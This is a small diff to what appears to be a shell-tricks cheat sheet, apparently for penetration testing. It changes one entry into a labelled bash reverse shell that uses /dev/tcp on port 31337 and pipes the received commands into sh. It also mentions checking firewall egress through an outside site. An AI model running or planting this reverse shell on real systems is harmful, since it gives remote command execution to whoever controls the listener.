@@ -110,10 +110,10 @@ cat /proc/net/arp
 
 ## Network Connections (requires bash)
 
-Connect to a port and execute the command received
+Connect to a port and execute the commands received (reverse shell)
 
 ```shell
-exec 3<>/dev/tcp/127.0.0.1/31337; cat <&3 | sh
+exec 3<>/dev/tcp/127.0.0.1/31337; cat <&3 | sh >&3
 ```
 
 Use letmeoutofyour.net to check firewall ACLs for a port
